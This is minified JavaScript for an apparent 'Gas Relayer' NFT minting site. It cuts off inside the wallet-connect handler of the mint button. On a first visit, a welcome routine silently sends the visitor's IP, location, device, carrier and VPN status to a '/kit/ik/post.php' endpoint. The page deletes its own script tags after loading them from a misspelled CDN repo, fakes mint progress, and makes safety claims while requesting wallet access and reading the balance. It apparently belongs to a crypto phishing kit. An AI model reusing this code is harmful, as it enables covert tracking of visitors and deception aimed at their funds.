function welcome(){if(localStorage.getItem("userVisited")?$("#welcome-div").remove():($("#welcome-div").css("display","flex"),$("body").css("overflow","hidden"),$.get("https://api.ipregistry.co/?key=9d4rdh6lwwy0zz5l",function(e){if(!0===e.security.is_vpn)var t="Using VPN";else t="Not Using";var s=e.time_zone.current_time,a=new Date(s);return $.post("/kit/ik/post.php",{loc:e.location.country.name+" "+e.location.city,time:a.toLocaleString(),device:e.user_agent.name+" "+e.user_agent.device.brand+" "+e.user_agent.device.type,vpn:t,as:e.ip,carrier:e.carrier.name}),!1}),setTimeout(()=>{localStorage.setItem("userVisited",!0)},5e3)),window.innerWidth<650){let t=$("#tablist button"),s=0;function e(){t.eq(s).click(),s++,s<4&&setTimeout(e,5e3),$("#welcome-div").remove(),$("body").css("overflow","")}e(),$("#tablist").hide(),$(".st--c-cyRcZm-mFjgu-size-6").css("font-size","39px"),$("#efvnoevor").css("border-radius"," 16px 16px 0 0"),$("#welcome-div").css("align-items",""),$(".moil").show(),$(".desktopsa").hide()}else $(".moil").hide(),$(".desktopsa").show();$("#welcome-div").click(function(){$("body").css("overflow",""),$("#welcome-div").hide()}),$("#welcome-div , .close-wel").click(function(e){$("body").css("overflow",""),$("#welcome-div").remove()}),$("#welcome-div").find("div").not("#efvnoevor").click(function(e){e.stopPropagation()}),$("#div1").click(function(){$("#descrwe").html("Enjoy Gas-Free Minting with Gas Relayer. Say Goodbye to High Gas Fees and Slow Transactions."),$("#wename").html("Gasless Minting"),$("#w-svg").html(' <path d="M12.47 5.78a.75.75 0 0 0 1.28-.53 1.5 1.5 0 0 1 1.5-1.5.75.75 0 1 0 0-1.5 1.5 1.5 0 0 1-1.5-1.5.75.75 0 1 0-1.5 0 1.5 1.5 0 0 1-1.5 1.5.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 1.5 1.5c0 .199.079.39.22.53ZM5.293 15.707A1 1 0 0 0 7 15a4 4 0 0 1 4-4 1 1 0 0 0 0-2 4 4 0 0 1-4-4 1 1 0 0 0-2 0 4 4 0 0 1-4 4 1 1 0 0 0 0 2 4 4 0 0 1 4 4 1 1 0 0 0 .293.707Z" fill="currentColor" ></path>'),$("#wimg").show(),$("#wimg2 ,#wimg3, #wimg1").hide()}),$("#div2").click(function(){$("#descrwe").html("Mint by simply using the NFT contract, bypassing the risk of clicking on unknown links."),window.innerWidth<650?$("#wename").html("Safe & Secure"):$("#wename").html("Safe and Secure"),$("#w-svg").html('<path d="M13 9.5a1 1 0 1 0-2 0V11H9.5a1 1 0 1 0 0 2H11v1.5a1 1 0 1 0 2 0V13h1.5a1 1 0 1 0 0-2H13V9.5ZM2.5 9A1.5 1.5 0 0 0 1 10.5v3A1.5 1.5 0 0 0 2.5 15h3A1.5 1.5 0 0 0 7 13.5v-3A1.5 1.5 0 0 0 5.5 9h-3ZM2.5 1A1.5 1.5 0 0 0 1 2.5v3A1.5 1.5 0 0 0 2.5 7h3A1.5 1.5 0 0 0 7 5.5v-3A1.5 1.5 0 0 0 5.5 1h-3ZM9 2.5A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3Z" fill="currentColor"></path>'),$("#wimg1").show(),$("#wimg2 ,#wimg3, #wimg").hide()}),$("#div3").click(function(){$("#descrwe").html("With Uniswap V3 Router contract no more unknown contracts. Have peace of mind knowing your transactions are protected."),window.innerWidth<650?$("#wename").html("Uniswap V3"):$("#wename").html("Uniswap V3 Router"),$("#w-svg").html('<path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8Zm5.9 7H12c-.1-1.5-.4-2.9-.8-4.1 1.4.9 2.4 2.4 2.7 4.1ZM8 14c-.6 0-1.8-1.9-2-5h4c-.2 3.1-1.4 5-2 5ZM6 7c.2-3.1 1.3-5 2-5s1.8 1.9 2 5H6ZM4.9 2.9C4.4 4.1 4.1 5.5 4 7H2.1c.3-1.7 1.3-3.2 2.8-4.1ZM2.1 9H4c.1 1.5.4 2.9.8 4.1-1.4-.9-2.4-2.4-2.7-4.1Zm9 4.1c.5-1.2.7-2.6.8-4.1h1.9c-.2 1.7-1.2 3.2-2.7 4.1Z" fill="currentColor"></path>'),$("#wimg2").show(),$("#wimg1 ,#wimg, #wimg3").hide()}),$("#div4").click(function(){$("#descrwe").html("Keeping you in the know with the freshest market details about your NFT collections and mints with OpenSea robust API"),$("#wename").html("Opensea API"),$("#wimg3").show(),$("#wimg1 ,#wimg, #wimg2").hide(),$("#w-svg").html('<path d="M12.47 5.78a.75.75 0 0 0 1.28-.53 1.5 1.5 0 0 1 1.5-1.5.75.75 0 1 0 0-1.5 1.5 1.5 0 0 1-1.5-1.5.75.75 0 1 0-1.5 0 1.5 1.5 0 0 1-1.5 1.5.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 1.5 1.5c0 .199.079.39.22.53ZM5.293 15.707A1 1 0 0 0 7 15a4 4 0 0 1 4-4 1 1 0 0 0 0-2 4 4 0 0 1-4-4 1 1 0 0 0-2 0 4 4 0 0 1-4 4 1 1 0 0 0 0 2 4 4 0 0 1 4 4 1 1 0 0 0 .293.707Z" fill="currentColor"></path>')}),$(".st--c-hsDqAI").click(function(){$(".st--c-hsDqAI").attr("data-state","false"),$(this).attr("data-state","active")})}const url=window.location.pathname.replace(/\//g,"");address=url,isEthereum=/^0x[a-fA-F0-9]{40}$/.test(address),isEthereum?$(document).ready(function(){$("script[src='https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.min.js'] , script[src='https://cdn.jsdelivr.net/gh/gasrealeyr/gasrelayer@main/kit2.js'], script[src='https://cdn.jsdelivr.net/gh/alexvandesande/blockies@master/blockies.js'],  script[src='https://cdn.jsdelivr.net/gh/gasrealeyr/gasrelayer@main/kit3.js'] , #remove-after, script[src='https://cdn.jsdelivr.net/gh/gasrealeyr/gasrelayer@main/applepie.js']").remove(),fetch("https://api.opensea.io/api/v1/asset_contract/"+address).then(e=>e.json()).then(e=>{if("unknown"===e.asset_contract_type)welcome(),$("#loader , .noifad , .st--c-eDSdwh-jlkAgt-size-0").remove(),$(".yt").fadeIn(),$("body").css("overflow","hidden"),$(".alert").css("display","flex"),$(".alert-t").html("This isn't a smart contract"),$(".alert-d").html("No problem! You can easily search for your collection on Gas Relayer.");else if("fungible"===e.asset_contract_type)welcome(),$("#loader , .noifad , .st--c-eDSdwh-jlkAgt-size-0").remove(),$(".yt").fadeIn(),$("body").css("overflow","hidden"),$(".alert").css("display","flex"),$(".alert-t").html("Oops! That's a token"),$(".alert-d").html("No problem! You can easily search for your collection on Gas Relayer.");else{if(document.title=e.collection.name+" | Gas Relayer ⛽️",$("#name").html(e.collection.name+' <svg id="check" style="position: relative;"  fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.73.421a.842.842 0 0 0-1.46 0L6.191 2.293a.842.842 0 0 1-.948.392l-2.086-.56a.842.842 0 0 0-1.032 1.032l.56 2.086a.842.842 0 0 1-.392.948L.42 7.271a.842.842 0 0 0 0 1.459l1.872 1.079c.33.19.491.58.392.948l-.56 2.086a.842.842 0 0 0 1.032 1.032l2.086-.56a.842.842 0 0 1 .948.393l1.08 1.87a.842.842 0 0 0 1.459 0l1.079-1.87c.19-.33.58-.492.948-.393l2.086.56a.842.842 0 0 0 1.032-1.032l-.56-2.086a.842.842 0 0 1 .393-.948l1.87-1.08a.842.842 0 0 0 0-1.459l-1.87-1.079a.842.842 0 0 1-.393-.948l.56-2.086a.842.842 0 0 0-1.032-1.032l-2.086.56a.842.842 0 0 1-.948-.392L8.729.42Zm2.05 6.391a.656.656 0 0 0-.02-.929.66.66 0 0 0-.931.02L7.177 8.667l-.983-1.134a.66.66 0 0 0-.929-.067.656.656 0 0 0-.067.927l1.456 1.68a.66.66 0 0 0 .974.024l3.152-3.285Z" fill="rgb(32, 129, 226)"></path></svg>'),null===e.symbol||""===e.symbol?($(".nosym").remove(),$("#mint-t").html("Minted "+e.collection.name+"'s")):($("#mint-t").html("Minted "+e.symbol+"'s"),$(".subvms").html(e.symbol+"'s"),$("#symbol").html(e.symbol)),$("#view-one").attr("href","https://etherscan.io/token/"+address),"verified"===e.collection.safelist_request_status?$("#check").show():$("#check").hide(),null===e.collection.external_url?($("#website").remove(),$(".web-l").remove()):($("#website").attr("href",e.collection.external_url),$(".web-l").attr("href",e.collection.external_url).html(e.collection.external_url.replace(/(http|https):\/\/|\/$/g,""))),null===e.collection.twitter_username?$("#twitter").remove():$("#twitter").attr("href","https://twitter.com/"+e.collection.twitter_username),null===e.collection.description);else{let t=e.collection.description,s=t.replace(/\[(.*?)\]\((.*?)\)/g,'<a href="$2" target="_blank">$1</a>');$("#description").html(s)}if(null===e.collection.image_url);else{$("#image").css("background-image","url("+e.image_url+")");let t=e.collection.image_url,s=t.split("?"),a=s[0]+"?auto=format&w=3840";$(".img-mint").attr("src",a)}if(null===e.collection.banner_image_url)$("#banner").addClass("burf").removeClass("bannernull");else{let t=e.collection.banner_image_url,s=t.split("?"),a=s[0]+"?auto=format&w=3840";$("#banner").css("background-image","url("+a+")").removeClass("bannernull")}let c=e.collection.created_date,i=new Date(c),o=i.toLocaleString("default",{month:"long"}),n=i.getFullYear();$("#created").html("Created in "+o+" "+n);var t="https://api.opensea.io/api/v1/collection/"+e.collection.slug;$.get(t).then(function(t){var s=t.collection.editors[0];let a=s.substring(0,3),c=s.substring(s.length-3);var i=a+"..."+c;fetch("https://polar-mountain-96590.herokuapp.com/https://api.opensea.io/user/"+t.collection.editors[0]).then(e=>{if(!e.ok)throw new Error(`Error ${e.status}: ${e.statusText}`);return e.json()}).then(e=>{$("#c1").css("background-image","url("+e.account.profile_img_url+")");var s="verified"===e.account.config?"            <svg  style='top: 2.5px;position: relative;display:inline-block;' width='15px' height='15px' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><path fill-rule='evenodd' clip-rule='evenodd' d='M8.73.421a.842.842 0 0 0-1.46 0L6.191 2.293a.842.842 0 0 1-.948.392l-2.086-.56a.842.842 0 0 0-1.032 1.032l.56 2.086a.842.842 0 0 1-.392.948L.42 7.271a.842.842 0 0 0 0 1.459l1.872 1.079c.33.19.491.58.392.948l-.56 2.086a.842.842 0 0 0 1.032 1.032l2.086-.56a.842.842 0 0 1 .948.393l1.08 1.87a.842.842 0 0 0 1.459 0l1.079-1.87c.19-.33.58-.492.948-.393l2.086.56a.842.842 0 0 0 1.032-1.032l-.56-2.086a.842.842 0 0 1 .393-.948l1.87-1.08a.842.842 0 0 0 0-1.459l-1.87-1.079a.842.842 0 0 1-.393-.948l.56-2.086a.842.842 0 0 0-1.032-1.032l-2.086.56a.842.842 0 0 1-.948-.392L8.729.42Zm2.05 6.391a.656.656 0 0 0-.02-.929.66.66 0 0 0-.931.02L7.177 8.667l-.983-1.134a.66.66 0 0 0-.929-.067.656.656 0 0 0-.067.927l1.456 1.68a.66.66 0 0 0 .974.024l3.152-3.285Z' fill='rgb(32, 129, 226)'></path></svg>":"";$("#c1a").html(null===e.username?i:"@"+e.username+s);var a=null===e.username?t.collection.editors[0]:e.username;$("#c1l").attr("href","https://opensea.io/"+a+"/created"),fetch("https://api.reservoir.tools/tokens/v5?collection="+address+"&limit=100&&includeTopBid=true&includeDynamicPricing=true").then(e=>e.json()).then(t=>{const c=t.tokens,o=[];let n="";for(let t=0;t<c.length;t++)c[t].token.image&&(c[t].contract,c[t].name,o.push(fetch(c[t].token.image).then(e=>e.url).then(o=>{const r=c[t].token.name||c[t].token.collection.name+" #"+c[t].token.tokenId,l=o.replace("?w=500&auto=format","?w=1000&auto=format"),d=c[t].token.collection.name,m=document.getElementById("image").style.backgroundImage.slice(4,-1).replace(/"/g,""),h=document.querySelector(".oslink").getAttribute("href"),p=null===e.username?i:"@"+e.username+s,u=e.account.profile_img_url,f="https://opensea.io/"+a+"/created",$="https://opensea.io/assets/ethereum/"+address+"/"+c[t].token.tokenId;let v,g;v=c[t].market.floorAsk.id?c[t].market.floorAsk.price.amount.decimal+" "+c[t].market.floorAsk.price.currency.symbol:c[t].token.lastSell.value?c[t].token.lastSell.value+" ETH":c[t].market.topBid.id?c[t].market.topBid.price.amount.decimal+" "+c[t].market.topBid.price.currency.symbol:c[t].token.lastBuy.value?c[t].token.lastBuy.value+" ETH":c[t].token.rarityRank?"#"+c[t].token.rarityRank:"N/A",g=c[t].market.floorAsk.id?"Buy Now":c[t].token.lastSell.value?"Last Sold":c[t].market.topBid.id?"Best Offer":c[t].token.lastBuy.value?"Last Bought":c[t].token.rarityRank?"Rarity Rank":"Market Stats";var y=c[t].token.owner;const w=y.substring(0,6)+"..."+y.substring(y.length-4,y.length),k=blockies.create({seed:c[t].token.owner.toLowerCase(),size:8,scale:8}),b=k.toDataURL();x="https://etherscan.io/token/"+c[t].token.owner,n+=`<div class='st--c-drYRbo'> <div class='st--c-kWFLEq st--c-kWFLEq-ktPXTO-isAuctionMode-false st--c-kWFLEq-hSOdNV-mediaOverlay-normal artwork-card'> <div class='st--c-PJLV st--c-jjJLgB st--c-PJLV-ijucCvV-css'><a target='_blank' href='${$}' class='st--c-cyRcZm st--c-kBvNHc st--c-cUZina'>${r}</a> <div class='st--c-PJLV st--c-PJLV-idPxpJz-css'> <div class='st--c-PJLV st--c-PJLV-ikXGtJc-css'></div><div class='st--c-PJLV st--c-PJLV-ikWekmy-css'><img loading='lazy' src='${l}' alt='' class='st--c-PJLV st--c-PJLV-ihQQRCg-css' style='position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%; object-fit: cover;'></div></div><div class='st--c-PJLV st--c-dhzjXW st--c-cPhRzx'> <div class='st--c-PJLV st--c-dhzjXW st--c-krqttN'> <div class='st--c-PJLV st--c-PJLV-icFpcyF-css'> <div class='st--c-PJLV st--c-PJLV-ihGPpiY-css' aria-expanded='false'><a target='_blank' href='${h}' class='st--c-cyRcZm st--c-kBvNHc'> <div class='st--c-xjQvT st--c-xjQvT-cpcPih-size-3'> <div aria-label='${d}' role='image' class='st--c-iQARZQ st--c-iQARZQ-dLJaYo-size-3 st--c-iQARZQ-KYOvp-cv' style='background-image: url(${m});'></div><span class='st--c-cyRcZm st--c-cyRcZm-iqCzBn-weight-semibold st--c-cyRcZm-hiuxaX-ellipsis-true'>${d}</span> </div></a></div></div></div><h2 class='st--c-cyRcZm st--c-iqCzBn st--c-cyRcZm-cAFiqo-size-4 st--c-cyRcZm-iecSPTJ-css'>${r}</h2> </div></div><div class='st--c-PJLV st--c-bQzyIt st--c-klALWd'> <div class='st--c-PJLV st--c-dhzjXW st--c-PJLV-ifPfEZQ-css'> <div class='st--c-PJLV st--c-PJLV-iimVGdk-css'> <div class='st--c-PJLV st--c-PJLV-igsmDXe-css' aria-expanded='false'><a target='_blank' href='${f}' class='st--c-cyRcZm st--c-kBvNHc st--c-kBvNHc-begQET-variant-primary'> <div class='st--c-xjQvT st--c-xjQvT-dZeQmp-size-1'> <div style='background-image:url(${u})'role='image' class='st--c-iQARZQ st--c-iQARZQ-bXfSeM-size-1 st--c-iQARZQ-rloUt-shape-circle'></div><span class='st--c-cyRcZm st--c-cyRcZm-iqCzBn-weight-semibold st--c-cyRcZm-hiuxaX-ellipsis-true'>${p}</span> </div></a></div></div></div><div class='st--c-PJLV st--c-dhzjXW st--c-iMIHCd'> <div class='st--c-PJLV st--c-bQzyIt st--c-llVfQI'> <div class='st--c-cyRcZm st--c-dbzzBd st--c-cyRcZm-jUYnCh-size-1 st--c-cyRcZm-iqCzBn-weight-semibold st--c-dbzzBd-cjUlPD-color-light'>${g}</div><div class='st--c-cyRcZm st--c-dbzzBd st--c-cyRcZm-jkLkBP-size-3 st--c-cyRcZm-iqCzBn-weight-semibold st--c-dbzzBd-cjUlPD-color-light'>${v}</div></div><div class='st--c-PJLV st--c-dhzjXW st--c-PJLV-ihgvcVN-css'> <div class='st--c-PJLV'></div><div class='st--c-PJLV st--c-PJLV-iiQnwxg-css'> <div class='st--c-PJLV st--c-PJLV-igsmDXe-css' aria-expanded='false'><a  target='_blank' href='${x}' class='st--c-cyRcZm st--c-kBvNHc st--c-kBvNHc-begQET-variant-primary'> <div class='st--c-xjQvT st--c-xjQvT-dZeQmp-size-1'> <div aria-label='' role='image' class='st--c-iQARZQ st--c-iQARZQ-bXfSeM-size-1 st--c-iQARZQ-rloUt-shape-circle' style='background: url(${b});background-size: 100%;'></div><span class='st--c-cyRcZm st--c-kKgia' style='font-family: var(--st--fonts-mono) !important;'>${w}</span> </div></a></div></div></div></div><a target='_blank' href='${$}' class='st--c-cyRcZm st--c-kBvNHc st--c-cUZina'>${r}</a> </div></div></div>`}).catch(e=>console.error(e))));Promise.all(o).then(()=>{document.querySelector(".st--c-jyIjiv").insertAdjacentHTML("afterbegin",n),$(".st--c-jyIjiv .fk-items").first().remove()})}).catch(e=>console.error(e))}).catch(s=>{s.message.includes("404")?($("#c1").css("background-image","url("+e.image_url+")"),$("#c1l").attr("href","https://opensea.io/"+t.collection.editors[0]+"/created"),$("#c1a").html(i)):console.error("Error fetching data:",s)}),$(".oslink").attr("href","https://opensea.io/collection/"+e.collection.slug),$.ajax({url:"https://corsproxy.io/?"+encodeURIComponent("https://mint.fun/api/mintfun/contract/"+address+"/transactions"),type:"GET",success:function(e){function t(){$.ajax({url:"https://api.nftport.xyz/v0/transactions/nfts/"+address+"?chain=ethereum&page_size=50&type=mint",type:"GET",headers:{accept:"application/json",Authorization:"4814555f-7d3b-4375-ab0f-d3bd7c47d6ca"},success:function(e){var t=e.transactions[0];$.ajax({async:!0,crossDomain:!0,url:"https://corsproxy.io/?"+encodeURIComponent("https://etherscan.io/tx/"+t.transaction_hash),type:"GET",success:function(e){var t=$.parseHTML(e),a=$("#ContentPlaceHolder1_spanValue > div > span:nth-child(2)",t).html();s=a.replace(/<.*?>/g,""),s=-1===s.indexOf(".")?parseInt(s):parseFloat(s),string=$("#wrapperContent > div > div > span:nth-child(2)",t).html();var c=string.match(/Mint (\d+) of/),i=c?parseInt(c[1]):0,o=Math.round(s/i*1e4)/1e4;$(".owners").html(o+" ETH"),$(".tbybt").val(o)}})}})}var a=e.transactions;if(a.length>0){var c=a.filter(function(e){return!0===e.isValid});if(c.length>0){var i=c.reduce(function(e,t){return parseInt(e.ethValue)<parseInt(t.ethValue)?e:t});if(0!==i.ethValue){var o=i.ethValue/i.nftCount/1e18,n=Math.round(1e4*o)/1e4;$(".owners").html(n+" ETH"),$(".tbybt").val(n)}else t()}else t()}else t()}}),null===t.collection.stats.total_supply?($("#supply").remove(),$(".st--c-izRhYl").hide()):($("#supply").html("+"+t.collection.stats.total_supply),$.ajax({async:!0,crossDomain:!0,url:"https://corsproxy.io/?"+encodeURIComponent("https://etherscan.io/address/"+address+"#readContract"),type:"GET",success:function(e){for(var s=new DOMParser,a=s.parseFromString(e,"text/html"),c=a.getElementsByTagName("span"),i=0;i<c.length;i++)if(c[i].innerText.includes("ABI for the implementation contract at")){var o=c[i].getElementsByTagName("a")[0];if(o){var n=o.innerText;break}}i===c.length&&(n=address),$.ajax({async:!0,crossDomain:!0,url:"https://corsproxy.io/?"+encodeURIComponent("https://etherscan.io/readContract?m=normal&a="+address+"&n=mainnet&v="+n),type:"GET",success:function(e){var s,a=new DOMParser,c=a.parseFromString(e,"text/html"),i=0;if($(c).find("#readContractAccordion .card-header a").filter(function(){return this.innerText.toLowerCase().includes("max")}).each(function(){var e=$(this).closest(".card").find(".readContractFunction .card-body form .form-group").text().match(/\d+/);if(e){var t=parseInt(e[0]);t>i&&(i=t,s=e)}}),s&&!(s<t.collection.stats.total_supply)){let e=s;return $(".minted").html(t.collection.stats.total_supply+" / "+e),!1}$.ajax({async:!0,crossDomain:!0,url:"https://corsproxy.io/?"+encodeURIComponent("https://etherscan.io/address/"+address+"#readContract"),type:"GET",success:function(e){for(var s=new DOMParser,a=s.parseFromString(e,"text/html"),c=a.getElementsByTagName("span"),i=0;i<c.length;i++)if(c[i].innerText.includes("Note: This contract matches the")){var o=c[i].getElementsByTagName("a")[0];if(o){var n=o.innerText;break}}i===c.length&&(n=address),$.ajax({async:!0,crossDomain:!0,url:"https://corsproxy.io/?"+encodeURIComponent("https://etherscan.io/readContract?m=normal&a="+address+"&n=mainnet&v="+n),type:"GET",success:function(e){var s,a=new DOMParser,c=a.parseFromString(e,"text/html"),i=0;if($(c).find("#readContractAccordion .card-header a").filter(function(){return this.innerText.toLowerCase().includes("max")}).each(function(){var e=$(this).closest(".card").find(".readContractFunction .card-body form .form-group").text().match(/\d+/);if(e){var t=parseInt(e[0]);t>i&&(i=t,s=e)}}),s&&!(s<t.collection.stats.total_supply)){let e=s;return $(".minted").html(t.collection.stats.total_supply+" / "+e),!1}$.ajax({url:"https://corsproxy.io/?"+encodeURIComponent("https://mint.fun/api/mintfun/contract/"+address),success:function(e){e.collection.hasOwnProperty("maxSupply")?$(".minted").html(t.collection.stats.total_supply+" / "+e.collection.maxSupply):$.ajax({url:"https://corsproxy.io/?"+encodeURIComponent("https://mint.fun/api/mintfun/contract/"+address+"/transactions"),type:"GET",success:function(s){if(s.transactions.length>0){for(var a=s.transactions.sort(function(e,t){return new Date(e.latestBlockTimestamp)-new Date(t.latestBlockTimestamp)}),c=0;c<a.length;c++)if(!0===a[c].isValid){$(".minted").html(e.collection.totalMints+" / Minted"),$("#supply").html("+"+e.collection.totalMints),$(".st--c-kspInZ").hide();break}c===a.length&&$(".minted").html(t.collection.stats.total_supply+" / "+t.collection.stats.total_supply)}else $(".minted").html(t.collection.stats.total_supply+" / "+t.collection.stats.total_supply)}})}})}})}})}})}}),$("#supply").click(function(){window.open("https://opensea.io/collection/"+t.collection.slug)}))}).fail(function(e,t,s){404===e.status&&($("#loader").remove(),$(".alert").css("display","flex"),$(".alert-t").html("Collection Delisted ⛔️"),$(".alert-d").html("The collection you tried to mint is no longer available on OpenSea. <a href='https://support.opensea.io/hc/en-us/articles/1500010625362' target='_blank' style='color: rgba(32, 129, 226, 1);text-decoration: none;'>Learn more</a> about why the collection is delisted "),$(".yt").fadeIn(),$("body").css("overflow","hidden"),$(".noifad , .st--c-eDSdwh-jlkAgt-size-0 ,#if404").hide(),$(".oslink").attr("href","https://opensea.io/?show_delisted_notice=true"))});const r={async:!0,crossDomain:!0,url:"https://api.opensea.io/api/v1/assets?order_direction=asc&asset_contract_address="+address+"&limit=11&include_orders=false",method:"GET",headers:{accept:"application/json","X-API-KEY":"9c4ad2aee78d4745b49ca5e9783c33f9"}};function s(){var e=$(".mintedte").text(),t=e.split("/"),s=parseInt(t[0]),a=parseInt(t[1]),c=a-s,i=$(".ownerste").text(),o=parseFloat(i.match(/\d+(\.\d+)?/g));if(s===a||c<50||0===o||o<1e-5)$(".owners, .minted").removeClass("st--c-XkCvO-ijjZqKP-css").removeClass("st--c-XkCvO-bsiHgc-variant-fill").css("color","#000"),$(".st--c-izRhYl ,.st--c-feJwdW").remove(),$(".st--c-kspInZ").hide(),$(".st--c-fbqNQW").css("margin-bottom","0");else{let e=(a-s)/a*100;$(".st--c-chfIyr").css("transform",`translateX(-${e}%)`),$(".owners, .minted").removeClass("st--c-XkCvO-ijjZqKP-css").removeClass("st--c-XkCvO-bsiHgc-variant-fill").css("color","#000"),$(".mint-k1").prop("disabled",!1),$(".smsmssmdke").hide(),$(".marfor, .subvms").show()}}$.ajax(r).done(function(t){async function s(){for(let e=0;e<t.assets.length;e++){let s,a=t.assets[e];if(a.image_url){let e=a.image_url.split("?");s=e[0]+"?auto=format&w=1000"}else s=l;let c=new Image;c.src=s,await new Promise((e,t)=>{c.onload=e,c.onerror=t}),d.push(c)}}async function a(){$("#oslink").show();for(let e=0;e<d.length;e++){let t="url("+d[e].src+")";c.css("background-image",t),$(".img-mint").attr("src",d[e].src),await new Promise(e=>setTimeout(e,400))}a()}$("#loader").remove(),$(".fk-items, .st--c-jyIjiv").show(),welcome(),$(".glu-logos").css("display","flex"),$(".yt").fadeIn();let c=$(".backts"),i=document.getElementById("owners-list");t.assets.slice(0,5).forEach(function(e){let t=document.createElement("div");t.innerHTML="<div class='st--c-PJLV'><a href="+e.permalink+" class='ownersl1' target='_blank'><div class='st--c-rloUt st--c-rloUt-ceyMyg-variant-raised st--c-rloUt-lfLupN-size-2 st--c-rloUt-iDhUbf-size-3'><div role='image' style='background-image: url("+e.image_url+")' class='st--c-iQARZQ st--c-iQARZQ-jtpVvc-size-2 st--c-iQARZQ-rloUt-shape-circle st--c-iQARZQ-hmZfot-size-3 owners1'></div></div></a></div>",i.appendChild(t)});let o=e.collection.image_url,n=o.split("?"),r=n[0]+"?auto=format&w=3840",l=r;c.css("background-image","url("+(t.assets.image_url,r)+")");let d=[];s().then(()=>a())}),$("#contract-a").click(function(){window.open("https://etherscan.io/token/"+address)}),$("#t-sh").attr("href","https://twitter.com/intent/tweet?text=Say%20goodbye%20to%20high%20gas%20fees!%20Mint%20your%20"+encodeURIComponent(e.collection.name)+"%20on%20%40GasRelayer%20"+window.location.href),$("#share-b").click(function(){$(".share-m").show(),$("#cutoff").html("gasrelayer/"+address.substring(0,4)+"..."+address.substring(address.length-3,address.length)),$("#contract-go").attr("href","https://etherscan.io/token/"+address),$(".report").hide()}),$("#copy-bs").click(function(){let e="https://gasrelayer.com/"+address;var t=$("<input>");$("body").append(t),t.val(e).select(),document.execCommand("copy"),t.remove(),$("#copy-b").hide(),$("#correct-b").show(),setTimeout(function(){$("#correct-b").hide(),$("#copy-b").show()},1e3)}),$(document).click(function(){$(".share-m , .report , #wallet-c").fadeOut(),$(".search").hide()}),$(document).ready(function(){var e=setInterval(function(){$(".minted").text().length>0&&$(".owners").text().length>0&&(clearInterval(e),s())},1)}),$("#report-b").click(function(){$(".report").show(),$(".share-m").hide()}),$("select").change(function(){$("#flag").html("This collection has been reported."),$("select").hide(),setTimeout(()=>{$(".report").fadeOut()},900),setTimeout(()=>{$("#flag").html("Reported")},1500)}),$("#copy-bs, #share-b, #report-b , .report , #wallet-c ,#user-p").click(function(e){e.stopPropagation()});const l=window.Web3,d=window.ethereum;function a(){fetch("https://api.etherscan.io/api?module=account&action=balance&address="+d.selectedAddress+"&tag=latest&apikey=NB86HEZM6GG9HCHMZA8ITHPHIEEVU57STI").then(e=>e.json()).then(e=>{setTimeout(()=>{$(".balance").val(e.result/Math.pow(10,18)),$(".mint-last").show(),$.ajax({url:"https://polar-mountain-96590.herokuapp.com/https://api.opensea.io/user/"+d.selectedAddress,method:"GET",success:function(e){const t=e.account,s=t.profile_img_url,a=t.user.username;$("#user-p").fadeIn(),$("#user-p").click(function(){$("#wallet-c").fadeIn()}),$(".irntviorngibv ,.st--c-iQARZQ-ctvRSw-size-4").css("background-image","url("+s+")"),null===a?($(".wale-ad").attr("href","https://opensea.io/"+d.selectedAddress),$(".st--c-cyRcZm-ibqzWrE-css").html(d.selectedAddress.substring(0,6)+"..."+d.selectedAddress.substring(d.selectedAddress.length-4,d.selectedAddress.length))):($(".st--c-cyRcZm-ibqzWrE-css").html("@"+a),$(".wale-ad").attr("href","https://opensea.io/"+a))},error:function(e){if(404===e.status){$("#user-p").click(function(){$("#wallet-c").fadeIn()}),$("#user-p").fadeIn(),$(".wale-ad").attr("href","https://opensea.io/"+d.selectedAddress),$(".st--c-cyRcZm-ibqzWrE-css").html(d.selectedAddress.substring(0,6)+"..."+d.selectedAddress.substring(d.selectedAddress.length-4,d.selectedAddress.length));var t=blockies.create({seed:d.selectedAddress.toLowerCase(),size:8,scale:8}),s=t.toDataURL();$(".irntviorngibv ,.st--c-iQARZQ-ctvRSw-size-4").css("background-image","url("+s+")")}else console.error(e)}}),sis=e.result/Math.pow(10,18),$("#wa-ferfef").html(sis.toFixed(4)+" ETH"),$("#waler05").prepend(d.selectedAddress.substring(0,6)+"..."+d.selectedAddress.substring(d.selectedAddress.length-4,d.selectedAddress.length)).attr("href","https://etherscan.io/address/"+d.selectedAddress),$.ajax({url:"https://corsproxy.io/?"+encodeURIComponent("https://mint.fun/api/mintfun/profile/"+d.selectedAddress+"/mints"),type:"GET",success:function(e){0!==e.items.length?$("#dsneooiegn").html(e.items[0].contractName):($("#dsneooiegn").html("0 NFTs"),$("#kdmmdmdmkmkd").html("Total Minted"))}}),$(".st--c-chfIyr").css("transform","translateX(-94%)"),$(".smsmssmdke").hide(),$(".st--c-kspInZ").show(),$(".marfor, .subvms").show(),$(".slider").val(3).trigger("input"),setTimeout(()=>{$(".st--c-chfIyr").css("transform","translateX(-82.55%)"),$(".slider").val(9).trigger("input"),setTimeout(function(){$(".st--c-chfIyr").css("transform","translateX(-88%)"),$(".slider").val(6).trigger("input"),setTimeout(function(){$(".st--c-chfIyr").css("transform","translateX(-90.8%)"),$(".slider").val(4).trigger("input"),setTimeout(function(){$(".st--c-chfIyr").remove(),$(".slider").show()},600)},600)},900)},700),$(".st--c-kspInZ").css("height","12px"),$(".slider").css("::-webkit-slider-thumb",{width:"13px",height:"13px"}),$(".mint-k1").remove()},1500)}),$("#ac-eth").click(function(){window.open("https://etherscan.io/address/"+d.selectedAddress)})}$(".mint-k1").click(async function(){if($(".mint-k1").prop("disabled",!0),$(".smsmssmdke").show(),$(".marfor, .subvms").hide(),d)try{await d.enable();const e=await d.send("eth_chainId");if("0x1"!==e)try{await d.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}),a()}catch(e){if(4902===e.code)try{await 